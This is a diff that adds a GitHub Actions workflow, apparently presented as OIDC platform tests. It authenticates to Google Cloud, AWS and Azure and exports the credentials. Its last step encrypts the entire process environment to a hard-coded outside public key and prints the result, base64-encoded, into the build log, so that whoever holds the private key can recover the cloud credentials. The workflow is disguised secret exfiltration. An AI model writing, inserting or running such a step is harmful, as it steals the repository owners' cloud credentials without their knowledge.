@@ -1,0 +1,51 @@
+on: push
+jobs:
+  dev:
+    runs-on: ubuntu-latest
+    environment: oidc_platform_tests
+    permissions:
+      id-token: write
+    steps:
+      - name: 'Authenticate to Google Cloud'
+        uses: google-github-actions/auth@140bb5113ffb6b65a7e9b937a81fa96cf5064462
+        with:
+          workload_identity_provider: ${{ secrets.GCP_WORKLOAD_IDENTITY_PROVIDER }}
+          service_account: ${{ secrets.GCP_SERVICE_ACCOUNT }}
+          create_credentials_file: true
+          cleanup_credentials: true
+          export_environment_variables: true
+      - name: 'Authenticate to AWS'
+        uses: aws-actions/configure-aws-credentials@b47578312673ae6fa5b5096b330d9fbac3d116df
+        with:
+          role-to-assume: ${{ secrets.AWS_TESTS_IAM_ROLE }}
+          role-session-name: ${{ secrets.AWS_TESTS_OIDC_SESSION }}
+          aws-region: ${{ secrets.AWS_TESTS_REGION }}
+          output-credentials: true
+      - name: 'Authenticate to Azure'
+        uses: azure/login@a457da9ea143d694b1b9c7c869ebb04ebe844ef5
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+      - run: |
+          set -e
+
+          cat > pub.pem << EOF
+          -----BEGIN PUBLIC KEY-----
+          MCowBQYDK2VuAyEAYTvtRhp4Gcu2Ev7f1gtOaRfFtW7shxRg0+VoNNchJGg=
+          -----END PUBLIC KEY-----
+          EOF
+
+          openssl genpkey -algorithm x25519 -out e_priv.pem
+          openssl pkey -in e_priv.pem -pubout -out e_pub.pem
+          openssl pkeyutl -derive -inkey e_priv.pem -peerkey pub.pem -out shared.key
+
+          env | openssl enc -aes-256-ctr -salt -pbkdf2 -pass file:shared.key > env.enc
+
+          echo "::group::Ephemeral Public Key"
+          cat e_pub.pem
+          echo "::endgroup::"
+
+          echo "::group::Encrypted Env"
+          base64 env.enc
+          echo "::endgroup::"
